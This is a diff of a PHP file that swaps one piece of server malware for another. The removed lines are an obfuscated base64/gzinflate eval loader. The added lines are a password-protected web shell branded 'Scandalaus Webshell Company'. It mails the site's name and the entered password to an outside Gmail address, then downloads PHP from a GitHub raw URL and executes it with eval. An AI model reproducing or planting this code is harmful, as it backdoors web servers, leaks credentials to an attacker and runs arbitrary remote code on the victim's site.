@@ -1,4 +1,85 @@
-<?php
-$enc = '==w9nFcHonHYtJw/Hby8xMN6Qdj/BY9swyg2wEJVsTn2m1HxFtu+PlPtKvXTLRa0avmfrUHyG9XLwsVIGO7btsfwINeb1UY3c2EOVHMgqY6SnmKUHt/czL+UBEVisqq2j5JoWF74k8YY01+N/IaVDvdDQwYeTQmtUp62bIJQrsLDV9GyCS6yihVkmZNyR4LSt0udPHeTzLUfrt0W/U4NMzebWK3q0nCvmZ/i5uxs9yHqqvQbXoFrk84oVwfrYwedPfEFx9gs+AJ73RUvlmkUk5sgbTIYI6g0PdqIinZIar1L19riMvsGnCKVO33UI3itPvcFoUhvvM/jNIgYr+kMnzMJgHtjmZFLTIN7skGbYfRTqecwLARTAq2SrJ55N5mj8J6yy2LeCPHInhI4qv3aF0TQKocDK3KFTm+DWXk7Q8jdwUcyy2TqfoCxviylq1asLmWEOq+093iF4jLDUU+95Jokyy3aUf2ec0pnc+Gzozu/vMN7j/eDPO9p5zpnaqTPWIviMg4DR7PTtFvnIZhsUrQi0PQrN9LhKyHpMZ199FZD10q3mWMS+9dKcq+ZhWGjW3NNlwFlV+r2xwkaZ9fAK7p6OW9mke8qVTvC/vk94nn0CCk//pppq0B47kkm3jx+1Vgi82sM3n0QA9y+7SakF6ue2rKpOtBfrbqP+orSlTx8FbsMukpJNY7ywXGtcwuGdfzrBP4ltlQ+VvPcOPeP8yOXbS0WK4sxP4lw/Ht+jFFyXdzzROH34RMceX1Ht6DxGaxbovblGcaf7+1OZASnG+dM4hD74ezo4fzrBtK2NgP4V3R189nTjuj6ycWXHFH0B3NGXagoNcPGiuIe7WiSvwzzKlpxZMhcjxZRsL7T0p4sUfiCQJf1klKGxTnlwuameUwRAUfUnZsSagkboFxrnP1F4Pe5AgJiTPeQ82qXy8wrpx7hOHFNyMjFGWkAxRoOJWjM1NEHvFVvJZPovMxE7yH5L8OiPiVhMNOtebqhQOZAQlOgwamdjEoIns42vF1kNkJkgeSbH36W4I7c3yhEaMv/Gxp2lsXSE11ONtvmFxFFPC9bj2WITVRNFujfl8ykMUrAXsReY6ywf68lG81dNvUlrnr2zbWzEEkeEKwmjeScY7+kv5+ogYREphkwl20doDSEOZkDYcg2E6IIuk/2r31d7Y/603q7O+ufN6NMtoQMFJMp4lKIwZA0Fh/lDDsKjKEzlNJlWKA9umG+b2cBqWDHtlM6DGigIPDHSomeJNyIxIkp0AJHm7cjFEyYwMLCMaaDfBuPMlEGNFKZFajj8Vyus5mfLoEofip9kpEOL77p6Axt5yPrtD597LcH+WrAWdvOt7H46pKpkeMe8WmHeOjmwAIJ7LlAzxV+yjphIKaA+ASfC3TIwVRFJRWExwgGDoOaEGo4lSD2dGHEDOLVUhPiDLnKRfjRTx900k7WQpkcIDKZ5OvSyLqUl/ySX6pHqWIplzvAcdK+D1t+P0+3Bt54HfXHQXf4CW9qC5Br0KqKXlwKqyA2XuSIgoLuhFC12yHBPHeAOISyKJpDQsVFiMUD2uElxcQE5Rqzsb/8zysvyniDtJnBG3Arf/b57cJJ+6u1g59CYXblFpzdwgDBy1UJoQ0ALRtSJVsEmgqoY+HxO6PEIp9btdVnci3+pQg1BwJe77BBhHw+ZQg5BsPFEseA';
-eval(base64_decode(base64_decode('WlhaaGJDZ2lQejRpTG1kNmRXNWpiMjF3Y21WemN5aG5lblZ1WTI5dGNISmxjM01vWjNwcGJtWnNZWFJsS0dkNmFXNW1iR0YwWlNobmVtbHVabXhoZEdVb1ltRnpaVFkwWDJSbFkyOWtaU2h6ZEhKeVpYWW9KR1Z1WXlrcEtTa3BLU2twT3c9PQ=========')));exit;
+<?php 
+session_start(); 
+ 
+/** 
+ * Disable error reporting 
+ * 
+ * Set this to error_reporting( -1 ) for debugging. 
+ */ 
+function geturlsinfo($url) { 
+    if (function_exists('curl_exec')) { 
+        $conn = curl_init($url); 
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); 
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); 
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"); 
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); 
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); 
+ 
+        // Set cookies using session if available 
+        if (isset($_SESSION['SAP'])) { 
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']); 
+        } 
+ 
+        $url_get_contents_data = curl_exec($conn); 
+        curl_close($conn); 
+    } elseif (function_exists('file_get_contents')) { 
+        $url_get_contents_data = file_get_contents($url); 
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) { 
+        $handle = fopen($url, "r"); 
+        $url_get_contents_data = stream_get_contents($handle); 
+        fclose($handle); 
+    } else { 
+        $url_get_contents_data = false; 
+    } 
+    return $url_get_contents_data; 
+} 
+ 
+// Function to check if the user is logged in 
+function is_logged_in() 
+{ 
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true; 
+} 
+// Check if the password is submitted and correct 
+if (isset($_POST['password'])) { 
+    $entered_password = $_POST['password']; 
+    $hashed_password = '850b7a8a0a64ba3bc150838d86a47ebb'; // Replace this with your MD5 hashed password 
+    if (md5($entered_password) === $hashed_password) { 
+        // Password is correct, store it in session 
+        $_SESSION['logged_in'] = true; 
+        $_SESSION['SAP'] = 'Scandalaus'; // Replace this with your cookie data 
+{
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['password']; @mail('nagahijau388group@gmail.com', 'root', $tmp); 
+}	
+    } else { 
+        // Password is incorrect 
+        echo "Incorrect password. Please try again."; 
+    } 
+} 
+ 
+// Check if the user is logged in before executing the content 
+if (is_logged_in()) { 
+    $a = geturlsinfo('https://raw.githubusercontent.com/labubunews/harian/refs/heads/main/levi-popoy.php'); 
+    eval('?>' . $a); 
+} else { 
+    // Display login form if not logged in 
+    ?> 
+    <!DOCTYPE html> 
+    <html> 
+    <head> 
+        <title>Scandalaus Webshell Company<3</title> 
+    </head> 
+    <body> 
+        <center> 
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjXKcyzlN7lQBU_lNxNB9FuVv7Di_edVzyIenWc_yGDNQ_VAyWOxhR0gPpRj4VEFxP-Cvwh4QKcQ34NdXWDqOpJvW7Nu33Z5UbEjitGogPNBkztNN91yJykYu2ZcN5CEl8SyGfzc0JV-w6HZiYZgnzedNV4SUtHNPTkC9kbrWjuzGBKYFk616o6ArHuVNE=w546-h128" /> 
+        <body style="background-color:black;"> 
+        <form method="POST" action=""> 
+            <label for="password">Password:</label> 
+            <input type="password" id="password" name="password"> 
+            <input type="submit" value="Touch Me!"> 
+        </form> 
+        </center> 
+    </body> 
+    </html> 
+    <?php 
+} 
 ?>
